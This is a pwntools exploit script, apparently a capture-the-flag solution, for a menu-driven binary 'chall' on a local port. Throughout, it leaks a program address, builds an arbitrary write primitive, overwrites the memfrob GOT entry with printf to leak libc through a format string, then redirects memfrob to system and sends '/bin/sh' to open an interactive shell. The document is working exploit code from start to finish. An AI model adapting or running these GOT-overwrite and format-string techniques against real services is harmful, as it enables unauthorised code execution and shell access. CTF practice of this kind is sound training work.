from pwn import *

context.binary = exe = ELF("./chall")
context.terminal = ["tmux", "splitw", "-h"]
libc = ELF("./libc.so.6")

gdbscript = """
breakrva 0x1388
c
"""

# io = gdb.debug(exe.path, gdbscript)
# io = process(exe.path)
io = remote("localhost", 50000)


def bet(n):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"bet: ", str(n).encode())
    io.readuntil(b"won: ")
    return int(io.readline().strip(), 16)


def shoot(val):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(val).encode())


def set_ptr(addr):
    n = 8
    addr = p64(addr, endian="big")
    while n > 0:
        cur = bet(n)
        cur = p64(cur, endian="big")
        # log.info(f'cur: {cur[n-1]:#x}, addr: {addr[n-1]:#x}, n: {n}')
        if cur[n - 1] == addr[n - 1]:
            n -= 1


def write(addr, value):
    log.info("starting big haxxx please wait (dont panic)")
    set_ptr(addr)
    shoot(value)


def thing(data):
    io.sendlineafter(b"> ", b"67")
    io.sendafter(b"lil bro\n", data)


leak = bet(1) & 0x00FFFFFFFFFFFFFF
log.success(f"leak: {hex(leak)}")
exe.address = leak - exe.sym["ptr"]
log.success(f"exe.address: {hex(exe.address)}")

log.info(f'hacking {hex(exe.sym["writes"])}')

write(exe.sym["writes"], 6767)  # give a shit ton of writes

write(exe.got["memfrob"], exe.plt["printf"])

payload = b"%3$p\n"
payload = payload.ljust(8, b"\x00")

thing(payload)

leak = int(io.readline().strip(), 16)

log.success(f"leak: {hex(leak)}")

libc.address = leak - 0xF829D

log.success(f"libc.address: {hex(libc.address)}")

gadget = libc.symbols["system"]

log.info(f"gadget: {hex(gadget)}")

write(exe.got["memfrob"], gadget)

payload = b"/bin/sh\x00"

thing(payload)

io.interactive()
